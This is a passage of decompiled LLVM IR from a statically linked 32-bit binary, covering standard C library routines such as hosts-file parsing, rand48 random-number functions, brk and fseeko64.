  %v2_8066474 = load i8, i8* %v1_8066457.lcssa, align 1
  %v3_8066474 = icmp eq i8 %v2_8066474, 0
  br i1 %v3_8066474, label %dec_label_pc_8066480, label %dec_label_pc_8066479

dec_label_pc_8066479:                             ; preds = %dec_label_pc_8066474.preheader, %dec_label_pc_8066470
  %v0_806642e = phi i32 [ %v0_8066474.lcssa, %dec_label_pc_8066470 ], [ %v0_80663f654, %dec_label_pc_8066474.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8066470, %dec_label_pc_8066470 ], [ 0, %dec_label_pc_8066474.preheader ]
  %v7_806647e = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_806647e, label %dec_label_pc_8066480, label %dec_label_pc_806642a

dec_label_pc_8066480:                             ; preds = %dec_label_pc_8066470, %dec_label_pc_8066479, %dec_label_pc_8066474.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8066474.preheader ], [ %v4_8066470, %dec_label_pc_8066470 ], [ %stack_var_-196.011, %dec_label_pc_8066479 ]
  store i32 %tmp, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_806f588.849 to i32), i32* %stack_var_-216, align 4
  %v3_8066494 = call i32 @__GI_strcoll(i8* %v2_8066494, i32 ptrtoint ([11 x i8]* @global_var_806f588.849 to i32))
  store i32 %v3_8066494, i32* @eax, align 4
  %v1_806649c = icmp eq i32 %v3_8066494, 0
  br i1 %v1_806649c, label %dec_label_pc_80664c4.preheader, label %dec_label_pc_80664d5

dec_label_pc_80664c4.preheader:                   ; preds = %dec_label_pc_8066480
  %v0_80664c487 = load i32, i32* @esi, align 4
  %v5_80664c891 = icmp slt i32 %v0_80664c487, %stack_var_-196.0.lcssa
  br i1 %v5_80664c891, label %dec_label_pc_80664ca.lr.ph, label %dec_label_pc_80664d5

dec_label_pc_80664ca.lr.ph:                       ; preds = %dec_label_pc_80664c4.preheader
  %v0_80664ca.pre = load i32, i32* @global_var_807f560.724, align 32
  br label %dec_label_pc_80664ca

dec_label_pc_80664a2:                             ; preds = %dec_label_pc_80664ca
  %v2_80664a5 = mul i32 %v0_80664c492, 4
  %v4_80664a5 = add i32 %v2_80664a5, %v3_80664a5
  %v5_80664a5 = inttoptr i32 %v4_80664a5 to i32*
  %v6_80664a5 = load i32, i32* %v5_80664a5, align 4
  %v1_80664ac = add i32 %v0_80664c492, 1
  store i32 %v1_80664ac, i32* @esi, align 4
  %v1_80664ad = inttoptr i32 %v6_80664a5 to i8*
  %v2_80664ad = call i32 @__GI_strdup(i8* %v1_80664ad)
  %v1_80664b5 = load i32, i32* @ebx, align 4
  %v2_80664b5 = mul i32 %v1_80664b5, 4
  %v3_80664b5 = add i32 %v2_80664b5, 134739284
  %v4_80664b5 = inttoptr i32 %v3_80664b5 to i32*
  store i32 %v2_80664ad, i32* %v4_80664b5, align 4
  %v0_80664bc = load i32, i32* @ebx, align 4
  %v1_80664bc = add i32 %v0_80664bc, 1
  store i32 %v1_80664bc, i32* @eax, align 4
  store i32 %v1_80664bc, i32* @global_var_807f560.724, align 32
  %v0_80664c4 = load i32, i32* @esi, align 4
  %v5_80664c8 = icmp slt i32 %v0_80664c4, %stack_var_-196.0.lcssa
  br i1 %v5_80664c8, label %dec_label_pc_80664ca, label %dec_label_pc_80664d5

dec_label_pc_80664ca:                             ; preds = %dec_label_pc_80664ca.lr.ph, %dec_label_pc_80664a2
  %v0_80664ca = phi i32 [ %v0_80664ca.pre, %dec_label_pc_80664ca.lr.ph ], [ %v1_80664bc, %dec_label_pc_80664a2 ]
  %v0_80664c492 = phi i32 [ %v0_80664c487, %dec_label_pc_80664ca.lr.ph ], [ %v0_80664c4, %dec_label_pc_80664a2 ]
  store i32 %v0_80664ca, i32* @ebx, align 4
  %v7_80664d3 = icmp sgt i32 %v0_80664ca, 2
  br i1 %v7_80664d3, label %dec_label_pc_80664d5, label %dec_label_pc_80664a2

dec_label_pc_80664d5:                             ; preds = %dec_label_pc_80664c4.preheader, %dec_label_pc_80664a2, %dec_label_pc_80664ca, %dec_label_pc_8066480
  store i32 ptrtoint ([7 x i8]* @global_var_806f593.850 to i32), i32* %stack_var_-216, align 4
  %v0_80664dc = load i32, i32* @edi, align 4
  %v2_80664dd = inttoptr i32 %v0_80664dc to i8*
  %v3_80664dd = call i32 @__GI_strcoll(i8* %v2_80664dd, i32 ptrtoint ([7 x i8]* @global_var_806f593.850 to i32))
  store i32 %v3_80664dd, i32* @eax, align 4
  %v1_80664e5 = icmp eq i32 %v3_80664dd, 0
  br i1 %v1_80664e5, label %dec_label_pc_8066527.preheader, label %dec_label_pc_80664e9

dec_label_pc_80664e9:                             ; preds = %dec_label_pc_80664d5
  store i32 ptrtoint ([7 x i8]* @global_var_806f59a.851 to i32), i32* %stack_var_-216, align 4
  %v0_80664f0 = load i32, i32* @edi, align 4
  %v2_80664f1 = inttoptr i32 %v0_80664f0 to i8*
  %v3_80664f1 = call i32 @__GI_strcoll(i8* %v2_80664f1, i32 ptrtoint ([7 x i8]* @global_var_806f59a.851 to i32))
  %v1_80664f9 = icmp eq i32 %v3_80664f1, 0
  br i1 %v1_80664f9, label %dec_label_pc_8066527.preheader, label %dec_label_pc_806656a

dec_label_pc_8066527.preheader:                   ; preds = %dec_label_pc_80664d5, %dec_label_pc_80664e9
  %v0_806652793 = load i32, i32* @global_var_807f564.845, align 4
  %tmp4196 = icmp slt i32 %v0_806652793, 1
  %tmp4297 = icmp eq i1 %tmp4196, false
  br i1 %tmp4297, label %dec_label_pc_80664ff, label %dec_label_pc_8066530

dec_label_pc_80664ff:                             ; preds = %dec_label_pc_8066527.preheader, %dec_label_pc_80664ff.dec_label_pc_80664ff_crit_edge
  %v0_806652798 = phi i32 [ %v0_8066527, %dec_label_pc_80664ff.dec_label_pc_80664ff_crit_edge ], [ %v0_806652793, %dec_label_pc_8066527.preheader ]
  %v1_80664ff = add i32 %v0_806652798, -1
  %v1_8066503 = mul i32 %v1_80664ff, 4
  %v2_8066503 = add i32 %v1_8066503, 134739268
  %v3_8066503 = inttoptr i32 %v2_8066503 to i32*
  %v4_8066503 = load i32, i32* %v3_8066503, align 4
  store i32 %v1_80664ff, i32* @global_var_807f564.845, align 4
  %v1_806650f = call i32 @free(i32 %v4_8066503)
  %v0_8066514 = load i32, i32* @global_var_807f564.845, align 4
  %v1_806651c = mul i32 %v0_8066514, 4
  %v2_806651c = add i32 %v1_806651c, ptrtoint (i32* @global_var_807f544.852 to i32)
  %v3_806651c = inttoptr i32 %v2_806651c to i32*
  store i32 0, i32* %v3_806651c, align 4
  %v0_8066527 = load i32, i32* @global_var_807f564.845, align 4
  %tmp41 = icmp slt i32 %v0_8066527, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_80664ff.dec_label_pc_80664ff_crit_edge, label %dec_label_pc_8066530

dec_label_pc_80664ff.dec_label_pc_80664ff_crit_edge: ; preds = %dec_label_pc_80664ff
  br label %dec_label_pc_80664ff

dec_label_pc_8066530:                             ; preds = %dec_label_pc_80664ff, %dec_label_pc_8066527.preheader
  %v0_8066527.lcssa = phi i32 [ %v0_806652793, %dec_label_pc_8066527.preheader ], [ %v0_8066527, %dec_label_pc_80664ff ]
  store i32 1, i32* @esi, align 4
  %v5_806655d103 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_806655d103, label %dec_label_pc_806655f, label %dec_label_pc_806656a

dec_label_pc_8066537:                             ; preds = %dec_label_pc_806655f
  %v2_806653a = mul i32 %v0_8066541105, 4
  %v4_806653a = add i32 %v2_806653a, %v3_80664a5
  %v5_806653a = inttoptr i32 %v4_806653a to i32*
  %v6_806653a = load i32, i32* %v5_806653a, align 4
  %v1_8066541 = add i32 %v0_8066541105, 1
  store i32 %v1_8066541, i32* @esi, align 4
  %v1_8066542 = inttoptr i32 %v6_806653a to i8*
  %v2_8066542 = call i32 @__GI_strdup(i8* %v1_8066542)
  %v1_806654a = load i32, i32* @ebx, align 4
  %v2_806654a = mul i32 %v1_806654a, 4
  %v3_806654a = add i32 %v2_806654a, 134739268
  %v4_806654a = inttoptr i32 %v3_806654a to i32*
  store i32 %v2_8066542, i32* %v4_806654a, align 4
  %v0_8066551 = load i32, i32* @ebx, align 4
  %v1_8066551 = add i32 %v0_8066551, 1
  store i32 %v1_8066551, i32* @global_var_807f564.845, align 4
  %v0_8066559.pre = load i32, i32* @esi, align 4
  %v5_806655d = icmp slt i32 %v0_8066559.pre, %stack_var_-196.0.lcssa
  br i1 %v5_806655d, label %dec_label_pc_806655f, label %dec_label_pc_806656a

dec_label_pc_806655f:                             ; preds = %dec_label_pc_8066530, %dec_label_pc_8066537
  %v0_8066541105 = phi i32 [ %v0_8066559.pre, %dec_label_pc_8066537 ], [ 1, %dec_label_pc_8066530 ]
  %v0_806655f104 = phi i32 [ %v1_8066551, %dec_label_pc_8066537 ], [ %v0_8066527.lcssa, %dec_label_pc_8066530 ]
  store i32 %v0_806655f104, i32* @ebx, align 4
  %v7_8066568 = icmp sgt i32 %v0_806655f104, 3
  br i1 %v7_8066568, label %dec_label_pc_806656a, label %dec_label_pc_8066537

dec_label_pc_806656a:                             ; preds = %dec_label_pc_80663f7.preheader, %dec_label_pc_80663f6, %dec_label_pc_8066530, %dec_label_pc_806655f, %dec_label_pc_8066537, %dec_label_pc_80664e9, %dec_label_pc_8066418, %dec_label_pc_806640f, %dec_label_pc_806656a.preheader
  %v0_806656a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8066571, i32* @ebx, align 4
  %v3_8066576 = call i32 @fgets(i32 %v2_8066571, i32 128, i32 %v0_806656a)
  %v1_806657e = icmp eq i32 %v3_8066576, 0
  %v1_8066580 = icmp eq i1 %v1_806657e, false
  br i1 %v1_8066580, label %dec_label_pc_80663f7.preheader, label %dec_label_pc_8066586

dec_label_pc_80663f7.preheader:                   ; preds = %dec_label_pc_806656a
  %v0_80663f7.pre = load i32, i32* @ebx, align 4
  %v4_80663f7.pre = load i32, i32* @ecx, align 4
  %v1_80663f747 = inttoptr i32 %v0_80663f7.pre to i8*
  %v2_80663f748 = load i8, i8* %v1_80663f747, align 1
  %v3_80663f749 = zext i8 %v2_80663f748 to i32
  %v5_80663f750 = and i32 %v4_80663f7.pre, -256
  %v6_80663f751 = or i32 %v3_80663f749, %v5_80663f750
  store i32 %v6_80663f751, i32* @ecx, align 4
  %v4_80663f952 = icmp eq i8 %v2_80663f748, 0
  br i1 %v4_80663f952, label %dec_label_pc_806656a, label %dec_label_pc_8066401.lr.ph

dec_label_pc_8066401.lr.ph:                       ; preds = %dec_label_pc_80663f7.preheader
  %v0_8066401.pre = load i32, i32* @global_var_8074fcc, align 4
  br label %dec_label_pc_8066401

dec_label_pc_8066586:                             ; preds = %dec_label_pc_806656a
  %v0_8066589 = load i32, i32* @ebp, align 4
  %v1_806658a = inttoptr i32 %v0_8066589 to i16*
  %v2_806658a = call i32 @__GI_fclose(i16* %v1_806658a)
  br label %dec_label_pc_806659f

dec_label_pc_8066594:                             ; preds = %dec_label_pc_80663d3
  %v0_8066594 = call i32 @__GI___h_errno_location()
  %v1_8066599 = inttoptr i32 %v0_8066594 to i32*
  store i32 3, i32* %v1_8066599, align 4
  br label %dec_label_pc_806659f

dec_label_pc_806659f:                             ; preds = %entry, %dec_label_pc_8066586, %dec_label_pc_8066594
  store i32 1, i32* %stack_var_-216, align 4
  %v3_80665ab = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v0_806637a, i32* @esi, align 4
  store i32 %v0_8066379, i32* @edi, align 4
  store i32 %v0_8066378, i32* @ebp, align 4
  ret i32 %v3_80665ab

; uselistorder directives
  uselistorder i32 %v0_8066401.pre, { 1, 0 }
  uselistorder i32 %v6_80663f751, { 1, 0 }
  uselistorder i8 %v2_80663f748, { 1, 2, 0 }
  uselistorder i8* %v1_80663f747, { 1, 0 }
  uselistorder i32 %v0_80663f7.pre, { 1, 0 }
  uselistorder i32 %v0_8066527, { 0, 2, 1 }
  uselistorder i32 %v0_80664ca, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8066462, { 1, 0 }
  uselistorder i32 %v2_8066443, { 1, 0 }
  uselistorder i32 %v1_8066437, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8066406, { 1, 0 }
  uselistorder i32 %v1_80663f6, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 0, 4, 3, 2, 1 }
  uselistorder i32 128, { 7, 11, 1, 8, 13, 14, 12, 2, 3, 15, 16, 17, 18, 19, 0, 4, 5, 6, 9, 10 }
  uselistorder i32 (i32)* @free, { 0, 30, 29, 28, 27, 26, 25, 24, 14, 11, 13, 12, 10, 8, 7, 6, 5, 4, 3, 2, 9, 23, 22, 21, 20, 19, 18, 17, 16, 33, 32, 31, 15, 1, 34 }
  uselistorder i32* @global_var_807f564.845, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32* @esp, { 25, 26, 27, 28, 29, 30, 5, 31, 32, 33, 34, 35, 11, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 7, 46, 47, 48, 8, 49, 4, 50, 51, 52, 53, 54, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 6, 69, 70, 71, 72, 73, 74, 10, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 12, 98, 22, 23, 24, 0, 1, 2, 3, 13, 76, 14, 99, 100, 101, 102, 15, 103, 104, 105, 106, 18, 107, 108, 109, 19, 110, 20, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 17, 124, 21, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 16, 137, 138, 139, 140, 148, 141, 143, 144, 147, 142, 149, 145, 146, 150 }
  uselistorder i8 10, { 0, 1, 2, 10, 3, 4, 5, 6, 7, 11, 9, 12, 8 }
  uselistorder i32 164, { 1, 0, 2 }
  uselistorder i32* @global_var_807f560.724, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_807500c.723 to i32), { 2, 0, 4, 5, 6, 7, 8, 9, 3, 10, 1 }
  uselistorder label %dec_label_pc_806659f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806656a, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_806655f, { 1, 0 }
  uselistorder label %dec_label_pc_80664ff, { 1, 0 }
  uselistorder label %dec_label_pc_8066527.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80664d5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80664ca, { 1, 0 }
  uselistorder label %dec_label_pc_8066480, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066479, { 1, 0 }
  uselistorder label %dec_label_pc_8066470, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806645d, { 1, 0 }
  uselistorder label %dec_label_pc_806643e, { 1, 0 }
  uselistorder label %dec_label_pc_806656a.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80665df = inttoptr i32 %arg3 to i32*
  %v10_80665df = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80665df, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80665df
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_8066abd = inttoptr i32 %arg2 to i32*
  %v4_8066abd = call i32 @nrand48_r(i32 %arg1, i32 %arg1, i32* %v3_8066abd)
  ret i32 %v4_8066abd
}

define i32 @nrand48_r(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8066ac8 = load i32, i32* @ebx, align 4
  store i32 %v0_8066ac8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8066ad5 = inttoptr i32 %arg1 to i16*
  %v3_8066ad5 = call i32 @__drand48_iterate(i16* %v2_8066ad5, i32 %arg2)
  %v2_8066ae0 = icmp slt i32 %v3_8066ad5, 0
  br i1 %v2_8066ae0, label %dec_label_pc_8066afb, label %dec_label_pc_8066ae4

dec_label_pc_8066ae4:                             ; preds = %entry
  %v0_8066ae4 = load i32, i32* @ebx, align 4
  %v1_8066ae4 = add i32 %v0_8066ae4, 4
  %v2_8066ae4 = inttoptr i32 %v1_8066ae4 to i16*
  %v3_8066ae4 = load i16, i16* %v2_8066ae4, align 2
  %v4_8066ae4 = zext i16 %v3_8066ae4 to i32
  %v1_8066ae8 = add i32 %v0_8066ae4, 2
  %v2_8066ae8 = inttoptr i32 %v1_8066ae8 to i16*
  %v3_8066ae8 = load i16, i16* %v2_8066ae8, align 2
  %v2_8066aec = mul nuw i32 %v4_8066ae4, 32768
  %div = udiv i16 %v3_8066ae8, 2
  %v2_8066aef = zext i16 %div to i32
  %v2_8066af1 = or i32 %v2_8066aef, %v2_8066aec
  store i32 %v2_8066af1, i32* %arg3, align 4
  br label %dec_label_pc_8066afb

dec_label_pc_8066afb:                             ; preds = %entry, %dec_label_pc_8066ae4
  %v0_8066afb = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8066ae4 ]
  %v2_8066aff = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066aff, i32* @ebx, align 4
  ret i32 %v0_8066afb

; uselistorder directives
  uselistorder i32 32768, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066afb, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v4_8066b04 = sext i16 %arg1 to i32
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8066b0e = sdiv i32 %v4_8066b04, 65536
  store i32 %v2_8066b0e, i32* @ecx, align 4
  %v3_8066b11 = add i32 %arg2, 2
  %v4_8066b11 = inttoptr i32 %v3_8066b11 to i16*
  store i16 %arg1, i16* %v4_8066b11, align 2
  %v0_8066b17 = load i32, i32* @ecx, align 4
  %v1_8066b17 = trunc i32 %v0_8066b17 to i16
  %v2_8066b17 = load i32, i32* %edx.global-to-local, align 4
  %v3_8066b17 = add i32 %v2_8066b17, 4
  %v4_8066b17 = inttoptr i32 %v3_8066b17 to i16*
  store i16 %v1_8066b17, i16* %v4_8066b17, align 2
  %v0_8066b1b = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b1b = inttoptr i32 %v0_8066b1b to i16*
  store i16 13070, i16* %v1_8066b1b, align 2
  %v0_8066b20 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b20 = add i32 %v0_8066b20, 16
  %v2_8066b20 = inttoptr i32 %v1_8066b20 to i32*
  store i32 -554899859, i32* %v2_8066b20, align 4
  %v0_8066b27 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b27 = add i32 %v0_8066b27, 20
  %v2_8066b27 = inttoptr i32 %v1_8066b27 to i32*
  store i32 5, i32* %v2_8066b27, align 4
  %v0_8066b2e = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b2e = add i32 %v0_8066b2e, 12
  %v2_8066b2e = inttoptr i32 %v1_8066b2e to i16*
  store i16 11, i16* %v2_8066b2e, align 2
  %v0_8066b34 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b34 = add i32 %v0_8066b34, 14
  %v2_8066b34 = inttoptr i32 %v1_8066b34 to i16*
  store i16 1, i16* %v2_8066b34, align 2
  ret i32 0
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8066c5c = load i32, i32* @ebx, align 4
  store i32 %v0_8066c5c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8066c6f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8066c6f, i32* @global_var_807da44.803, align 4
  %v7_8066c7a = icmp ult i32 %v1_8066c6f, %arg1
  %v1_8066c7c = icmp eq i1 %v7_8066c7a, false
  br i1 %v1_8066c7c, label %dec_label_pc_8066c8c, label %dec_label_pc_8066c7e

dec_label_pc_8066c7e:                             ; preds = %entry
  %v0_8066c7e = load i32, i32* %stack_var_-4, align 4
  %v1_8066c7e = call i32 @__errno_location(i32 %v0_8066c7e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8066c86 = inttoptr i32 %v1_8066c7e to i32*
  store i32 12, i32* %v1_8066c86, align 4
  %v0_8066c8d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8066c8c

dec_label_pc_8066c8c:                             ; preds = %entry, %dec_label_pc_8066c7e
  %v0_8066c8d = phi i32 [ 0, %entry ], [ %v0_8066c8d.pre, %dec_label_pc_8066c7e ]
  %v2_8066c90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066c90, i32* @ebx, align 4
  ret i32 %v0_8066c8d

; uselistorder directives
  uselistorder i32 %v1_8066c6f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_807da44.803, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066c8c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8066d1b = ashr i32 %arg2, 31
  %v4_8066d22 = inttoptr i32 %arg1 to i16*
  %v5_8066d22 = call i32 @__GI_fseeko64(i16* %v4_8066d22, i32 %arg2, i32 %v1_8066d1b, i32 %arg3)
  ret i32 %v5_8066d22
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8066d90 = load i32, i32* @ebp, align 4
  %v0_8066d91 = load i32, i32* @edi, align 4
  %v0_8066d92 = load i32, i32* @esi, align 4
  %v0_8066d93 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8066da3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066da3, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8066dc7, label %dec_label_pc_8066db4

dec_label_pc_8066db4:                             ; preds = %entry
  %v1_8066db4 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_8066db4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @ebx, align 4
  %v1_8066dbc = inttoptr i32 %v1_8066db4 to i32*
  store i32 22, i32* %v1_8066dbc, align 4
  br label %dec_label_pc_8066e6d

dec_label_pc_8066dc7:                             ; preds = %entry
  %v1_8066dc7 = add i32 %v4_8066da3, 52
  %v2_8066dc7 = inttoptr i32 %v1_8066dc7 to i32*
  %v3_8066dc7 = load i32, i32* %v2_8066dc7, align 4
  store i32 %v3_8066dc7, i32* @ebp, align 4
  %v1_8066dca = icmp eq i32 %v3_8066dc7, 0
  %v1_8066dcc = icmp eq i1 %v1_8066dca, false
  br i1 %v1_8066dcc, label %dec_label_pc_8066ded, label %dec_label_pc_8066dce

dec_label_pc_8066dce:                             ; preds = %dec_label_pc_8066dc7
  %v1_8066dce = add i32 %v4_8066da3, 56
  store i32 %v1_8066dce, i32* @ebx, align 4
  %v2_8066dd8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8066dd8, i32* %eax.global-to-local, align 4
  %v5_8066ddd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-44, i32 134586897, i32 %v1_8066dce)
  store i32 %v5_8066ddd, i32* %eax.global-to-local, align 4
  %v0_8066de2 = load i32, i32* @ebx, align 4
  %v2_8066de5 = call i32 @pthread_mutex_lock(i32 %v0_8066de2)
  store i32 %v2_8066de5, i32* %eax.global-to-local, align 4
  %v0_8066ded.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066ded

dec_label_pc_8066ded:                             ; preds = %dec_label_pc_8066dc7, %dec_label_pc_8066dce
  %v0_8066df5 = phi i32 [ %v4_8066da3, %dec_label_pc_8066dc7 ], [ %v0_8066ded.pre, %dec_label_pc_8066dce ]
  %v1_8066ded = inttoptr i32 %v0_8066df5 to i8*
  %v2_8066ded = load i8, i8* %v1_8066ded, align 1
  %v3_8066ded = and i8 %v2_8066ded, 64
  %v4_8066ded = icmp eq i8 %v3_8066ded, 0
  br i1 %v4_8066ded, label %dec_label_pc_8066e02, label %dec_label_pc_8066df2

dec_label_pc_8066df2:                             ; preds = %dec_label_pc_8066ded
  %v2_8066df6 = call i32 @__stdio_wcommit(i32 %v0_8066df5)
  store i32 %v2_8066df6, i32* %eax.global-to-local, align 4
  %v1_8066dfe = icmp eq i32 %v2_8066df6, 0
  %v1_8066e00 = icmp eq i1 %v1_8066dfe, false
  br i1 %v1_8066e00, label %dec_label_pc_8066e55, label %dec_label_pc_8066e02

dec_label_pc_8066e02:                             ; preds = %dec_label_pc_8066df2, %dec_label_pc_8066ded
  %v0_8066e02 = load i32, i32* @edi, align 4
  %v9_8066e02 = icmp eq i32 %v0_8066e02, 1
  %v1_8066e05 = icmp eq i1 %v9_8066e02, false
  br i1 %v1_8066e05, label %dec_label_pc_8066e02.dec_label_pc_8066e1b_crit_edge, label %dec_label_pc_8066e07

dec_label_pc_8066e02.dec_label_pc_8066e1b_crit_edge: ; preds = %dec_label_pc_8066e02
  %.pre7 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8066e1b

dec_label_pc_8066e07:                             ; preds = %dec_label_pc_8066e02
  %v0_8066e07 = load i32, i32* @ecx, align 4
  %v2_8066e09 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8066e09, i32* %eax.global-to-local, align 4
  %v0_8066e0e = load i32, i32* @esi, align 4
  %v5_8066e0e = inttoptr i32 %v0_8066e0e to i16*
  %v6_8066e0f = call i32 @__stdio_adjust_position(i16* %v5_8066e0e, i32 %v2_8066e09, i32 %v0_8066e07, i32 %v0_8066e07)
  store i32 %v6_8066e0f, i32* %eax.global-to-local, align 4
  %v2_8066e17 = icmp slt i32 %v6_8066e0f, 0
  br i1 %v2_8066e17, label %dec_label_pc_8066e55, label %dec_label_pc_8066e07.dec_label_pc_8066e1b_crit_edge

dec_label_pc_8066e07.dec_label_pc_8066e1b_crit_edge: ; preds = %dec_label_pc_8066e07
  %v0_8066e1c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8066e1b

dec_label_pc_8066e1b:                             ; preds = %dec_label_pc_8066e02.dec_label_pc_8066e1b_crit_edge, %dec_label_pc_8066e07.dec_label_pc_8066e1b_crit_edge
  %v2_8066e1d.pre-phi = phi i32 [ %.pre7, %dec_label_pc_8066e02.dec_label_pc_8066e1b_crit_edge ], [ %v2_8066e09, %dec_label_pc_8066e07.dec_label_pc_8066e1b_crit_edge ]
  %v0_8066e1c = phi i32 [ %v0_8066e02, %dec_label_pc_8066e02.dec_label_pc_8066e1b_crit_edge ], [ %v0_8066e1c.pre, %dec_label_pc_8066e07.dec_label_pc_8066e1b_crit_edge ]
  %v0_8066e1b = load i32, i32* @edx, align 4
  store i32 %v2_8066e1d.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8066e22 = load i32, i32* @esi, align 4
  %v5_8066e23 = inttoptr i32 %v2_8066e1d.pre-phi to i32*
  %v6_8066e23 = call i32 @__stdio_seek(i32 %v0_8066e22, i32* %v5_8066e23, i32 %v0_8066e1c, i32 %v0_8066e1b)
  store i32 %v6_8066e23, i32* %eax.global-to-local, align 4
  %v2_8066e2b = icmp slt i32 %v6_8066e23, 0
  br i1 %v2_8066e2b, label %dec_label_pc_8066e55, label %dec_label_pc_8066e2f

dec_label_pc_8066e2f:                             ; preds = %dec_label_pc_8066e1b
  %v0_8066e2f = load i32, i32* @esi, align 4
  %v1_8066e2f = inttoptr i32 %v0_8066e2f to i32*
  %v2_8066e2f = load i32, i32* %v1_8066e2f, align 4
  store i32 %v2_8066e2f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8066e33 = add i32 %v0_8066e2f, 44
  %v2_8066e33 = inttoptr i32 %v1_8066e33 to i32*
  store i32 0, i32* %v2_8066e33, align 4
  %v0_8066e3a = load i32, i32* @esi, align 4
  %v1_8066e3a = add i32 %v0_8066e3a, 2
  %v2_8066e3a = inttoptr i32 %v1_8066e3a to i8*
  store i8 0, i8* %v2_8066e3a, align 1
  %v0_8066e3e = load i32, i32* %eax.global-to-local, align 4
  %v1_8066e3e = and i32 %v0_8066e3e, -72
  store i32 %v1_8066e3e, i32* %eax.global-to-local, align 4
  %v1_8066e41 = trunc i32 %v1_8066e3e to i16
  %v2_8066e41 = load i32, i32* @esi, align 4
  %v3_8066e41 = inttoptr i32 %v2_8066e41 to i16*
